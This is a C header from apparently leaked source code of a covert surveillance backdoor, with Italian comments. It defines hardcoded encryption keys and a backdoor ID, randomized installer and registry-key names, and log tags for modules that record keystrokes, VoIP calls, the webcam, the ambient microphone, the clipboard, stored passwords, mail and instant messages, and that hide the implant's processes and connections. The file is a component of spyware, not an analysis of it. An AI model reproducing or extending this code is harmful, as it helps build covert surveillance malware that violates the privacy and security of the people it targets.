#define SAFE_VFREE(x) if(x) { VirtualFree(x, 0 , MEM_RELEASE); x=NULL; }
#define SAFE_FREE(x) if(x) { free(x); x=NULL; }

#define MMCPY(DST, SRC, SIZE) for(DWORD i=0; i<SIZE; i++)  *(((BYTE *)DST)+i) = *(((BYTE *)SRC)+i);
#define ADDR_LIMIT (BYTE *)0xFFFFFFFF
#define VALIDPTR(x)	if(!(x)) return FALSE;
#define HANDLE_SENT_MESSAGES(y) MSG sm_msg; PeekMessage(&sm_msg, NULL, 0, 0, PM_REMOVE); Sleep(y);
#define LOOP for(;;)

// Chiave UNIVOCA fra server e client
#define WATERMARK "B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW"
#define BIN_PATCHED_REGISTRY_KEY "JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34"

#define CLIENT_KEY "ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ"
#define ENCRYPTION_KEY "WfClq6HxbSaOuJGaH5kWXr7dQgjYNSNg"
#define ENCRYPTION_KEY_CONF "6uo_E0S4w_FD0j9NEhW2UpFw9rwy90LY"
#define BACKDOOR_ID "EMp7Ca7-fpOBIr"
#define DEMO_TAG "Pg-WaVyPzMMMMmGbhP6qAigT"


#define EXPORTED_FUNC "PPPFTBBP09"
#define WRAPPER_COUNT 14 // XXX Da cambiare se aggiungo un wrapper
#define MAX_RAND_NAME 30 // lunghezza massima dei nomi di directory/chiavi registry

#define IF_SAME_STRING(x,y,z) BOOL is_equal;\
	                      is_equal = TRUE;\
			  		      if (x) {\
							DWORD i = 0;\
							while(y[i]) { \
								if (i>=z) { is_equal = FALSE; break; } \
								if (x[i]!=y[i]) { is_equal = FALSE; break; } \
								i++; }\
							if (i!=z) is_equal = FALSE; \
					      } else is_equal = FALSE; \
                          if (is_equal)

typedef BOOL		(__stdcall *FreeLibrary_t) (HMODULE);
typedef FARPROC		(__stdcall *GetProcAddress_t) (HMODULE, char *);
typedef HINSTANCE	(__stdcall *LoadLibrary_t) (WCHAR *);
typedef DWORD		(__stdcall *GetCurrentProcessId_t) (void);
typedef BOOL		(__stdcall *IsWindow_t) (HWND);
typedef BOOL		(__stdcall *IsWow64Process_t) (HANDLE InProc, BOOL *OutResult);

extern BOOL FindModulePath(WCHAR *path_buf, DWORD path_size);
extern BOOL IsX64Process(DWORD pid);
extern DWORD GetParentPid(DWORD chpid);
extern WCHAR *FindProc(DWORD pid);
extern WCHAR *ScrambleName(WCHAR *string, BYTE scramble, BOOL crypt);
extern BOOL IsMyProcess(DWORD pid);
extern BOOL AmIThis(WCHAR *proc_name);

extern DWORD g_core_pid;
extern WCHAR g_directory_name[MAX_RAND_NAME];
extern WCHAR g_installer_name[MAX_RAND_NAME];
extern WCHAR g_registry_key_name[MAX_RAND_NAME];

// TAG DEI LOG
#define PM_FILEAGENT 0x00000000
#define PM_KEYLOGAGENT (PM_FILEAGENT + WRAPPER_MAX_SHARED_MEM) // 0x0040
#define WR_HIDE_PID  (PM_KEYLOGAGENT + WRAPPER_MAX_SHARED_MEM) // 0x0080
#define WR_HIDE_CON  (WR_HIDE_PID + WRAPPER_MAX_SHARED_MEM)    // 0x00C0
#define PM_PRINTAGENT (WR_HIDE_CON + WRAPPER_MAX_SHARED_MEM)   // 0x0100
#define PM_VOIPRECORDAGENT (PM_PRINTAGENT + WRAPPER_MAX_SHARED_MEM) // 0x0140
#define PM_URLLOG (PM_VOIPRECORDAGENT + WRAPPER_MAX_SHARED_MEM)     // 0x0180
#define PM_ONNEWWINDOW_IPC (PM_URLLOG + WRAPPER_MAX_SHARED_MEM)   // 0x01C0
#define PM_CONTACTSAGENT      0x0200
#define PM_DEVICEINFO         0x0240
#define PM_MOUSEAGENT         0x0280
#define PM_CRISISAGENT        0x02C0
#define PM_IMAGENT_SKYPE      0x0300

#define PM_URLAGENT_SNAP (PM_URLLOG + 1) // Usato per gli snapshot degli url (non e' un agente ma solo un logtype)
#define PM_FILEAGENT_CAPTURE 0x00000001  // (non e' un agente ma solo un logtype)
#define PM_AMBMICAGENT        0xC2C2
#define PM_WEBCAMAGENT        0xE9E9
#define PM_CLIPBOARDAGENT     0xD9D9
#define PM_PSTOREAGENT        0xFAFA
#define PM_IMAGENT            0xC6C6
#define PM_MAILAGENT          0x1001      
#define PM_APPLICATIONAGENT   0x1011
#define PM_PDAAGENT           0xDF7A
#define PM_EXPLOREDIR         0xEDA1
#define PM_DOWNLOAD           0xD0D0  
#define PM_SNAPSHOTAGENT      0xB9B9 